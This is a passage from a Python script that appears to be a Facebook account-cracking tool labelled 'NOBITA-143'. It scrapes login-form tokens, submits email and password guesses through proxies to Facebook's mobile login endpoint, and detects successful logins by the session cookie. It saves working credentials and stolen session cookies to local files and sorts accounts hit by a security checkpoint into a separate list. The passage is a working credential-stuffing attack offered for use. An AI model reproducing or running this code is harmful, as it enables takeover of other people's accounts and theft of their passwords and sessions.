			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
			data = {'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '1.8000000715255737',
    'referer': 'https://m.facebook.com/bookmarks/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua2,
    'viewport-width': '980',
}		
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [\033[1;37mNOBITA-143-FILE-OK\033[1;32m\033[1;37m] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/NOBITA-143-FILE-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				jones(idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}\033[1;36mNOBITA-143-FILE-CP \033[1;37m{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/NOBITA-143-FILE-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
 

#__________________[ SYSTEM-CONTROL ]__________________#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    menu()